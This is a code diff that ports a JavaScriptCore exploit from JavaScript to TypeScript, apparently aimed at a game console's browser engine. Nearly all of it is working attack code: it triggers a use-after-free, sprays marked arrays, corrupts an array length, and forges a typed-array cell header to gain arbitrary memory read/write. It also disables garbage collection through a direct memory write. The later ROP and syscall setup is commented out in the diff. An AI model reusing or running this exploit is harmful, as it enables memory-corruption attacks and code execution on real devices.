@@ -1,8 +1,11 @@
+import { BigInt, mem } from 'download0/types'
+import { make_uaf } from 'download0/defs'
+
 include('types.js')
 include('defs.js')
 
 // needed for arw
-var u32_structs
+var u32_structs: Uint32Array[]
 var spray_size = 0x100
 var marked_arr_offset = -1
 var corrupted_arr_idx = -1
@@ -10,10 +13,14 @@ var marker = new BigInt(0xFFFF0000, 0x13371337)
 var indexing_header = new BigInt(spray_size, spray_size)
 
 // used for arw
-var master, slave, master_addr, slave_addr, slave_buf_addr
+var master: Uint32Array | undefined
+var slave: DataView
+var master_addr: BigInt = BigInt.Zero
+var slave_addr: BigInt
+var slave_buf_addr: BigInt
 
 // used for addrof/fakeobj
-var leak_obj, leak_obj_addr
+var leak_obj: Record<string, unknown>, leak_obj_addr: BigInt
 
 log('Initiate UAF...')
 
@@ -28,15 +35,15 @@ log('Achieved UAF !!')
 log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
 var spray = new Array(0x1000)
-for (var i = 0; i < spray.length; i++) {
-    spray[i] = new Array(spray_size).fill(0x13371337)
+for (let i = 0; i < spray.length; i++) {
+  spray[i] = new Array(spray_size).fill(0x13371337)
 }
 
 log('Looking for marked array...')
-// find sprayed candidate by marker then corrupt its length 
-for (var i = 8; i < uaf_view.byteLength; i += 16) { 
-  if (uaf_view.getBigInt(i - 8, true).eq(indexing_header)
-    && uaf_view.getBigInt(i, true).eq(marker)) {
+// find sprayed candidate by marker then corrupt its length
+for (let i = 8; i < uaf_view.byteLength; i += 16) {
+  if (uaf_view.getBigInt(i - 8, true).eq(indexing_header) &&
+    uaf_view.getBigInt(i, true).eq(marker)) {
     log(`Found marker at uaf_view[${i}] !!`)
 
     marked_arr_offset = i - 8
@@ -87,8 +94,9 @@ leak_obj_addr = uaf_view.getBigInt(marked_arr_obj_offset, true)
 
 // store Uint32Array structure ids to be used for fake master id later
 u32_structs = new Array(0x100)
-for (var i = 0; i < u32_structs.length; i++) {
+for (let i = 0; i < u32_structs.length; i++) {
   u32_structs[i] = new Uint32Array(1)
+  // @ts-expect-error explicitly create property in Uint32Array
   u32_structs[i][`spray_${i}`] = 0x1337
 }
 
@@ -100,10 +108,10 @@ var rw_obj = { js_cell: js_cell.d(), butterfly: null, vector: slave, length_and_
 var structure_id = 0x80
 while (!(master instanceof Uint32Array)) {
   js_cell = new BigInt(
-      0x00 // IndexingType::NonArray
-    | 0x23 << 8 // JSType::Uint32ArrayType
-    | 0xE0 << 16 // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
-    | 0x01 << 24, // CellType::DefinitelyWhite
+    0x00 | // IndexingType::NonArray
+    0x23 << 8 | // JSType::Uint32ArrayType
+    0xE0 << 16 | // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
+    0x01 << 24, // CellType::DefinitelyWhite
     structure_id++ // StructureID
   )
 
@@ -131,7 +139,7 @@ mem.view(slave_addr).setUint8(6, 0xA0) // TypeInfo::InlineTypeFlags::OverridesGe
 mem.view(slave_addr).setInt32(0x18, -1, true)
 mem.view(slave_addr).setInt32(0x1C, 1, true)
 
-var slave_buf_addr = mem.view(slave_addr).getBigInt(0x20, true)
+slave_buf_addr = mem.view(slave_addr).getBigInt(0x20, true)
 mem.view(slave_buf_addr).setInt32(0x20, -1, true)
 
 log('Achieved ARW !!')
@@ -172,27 +180,27 @@ var eboot_addr = native_invoke_addr.sub(0x39330)
 mem.view(jsc_addr).setUint32(0x1E75B20, 1, true)
 log('Disabled GC')
 
-rop.init(jsc_addr)
+// rop.init(jsc_addr)
 
-fn.register(libc_addr.add(0x5F0), 'sceKernelGetModuleInfoForUnwind', 'bigint')
+// fn.register(libc_addr.add(0x5F0), 'sceKernelGetModuleInfoForUnwind', 'bigint')
 
-var libkernel_addr = utils.base_addr(_error_addr)
+// var libkernel_addr = utils.base_addr(_error_addr)
 
-log(`jsc address: ${jsc_addr}`)
-log(`libc address: ${libc_addr}`)
-log(`libkernel address: ${libkernel_addr}`)
-log(`eboot address: ${eboot_addr}`)
+// log(`jsc address: ${jsc_addr}`)
+// log(`libc address: ${libc_addr}`)
+// log(`libkernel address: ${libkernel_addr}`)
+// log(`eboot address: ${eboot_addr}`)
 
-syscalls.init(libkernel_addr)
+// syscalls.init(libkernel_addr)
 
-debug(`Found ${syscalls.map.size} syscalls`)
+// debug(`Found ${syscalls.map.size} syscalls`)
 
-fn.register(_error_addr, '_error', 'bigint')
-fn.register(strerror_addr, 'strerror', 'string')
-fn.register(0x14, 'getpid', 'bigint')
-fn.register(0x29, 'dup', 'bigint')
-fn.register(0x4, 'write', 'bigint')
-fn.register(0x5, 'open', 'bigint')
-fn.register(0x6, 'close', 'bigint')
+// fn.register(_error_addr, '_error', 'bigint')
+// fn.register(strerror_addr, 'strerror', 'string')
+// fn.register(0x14, 'getpid', 'bigint')
+// fn.register(0x29, 'dup', 'bigint')
+// fn.register(0x4, 'write', 'bigint')
+// fn.register(0x5, 'open', 'bigint')
+// fn.register(0x6, 'close', 'bigint')
 
-utils.notify('UwU')
+// utils.notify('UwU')
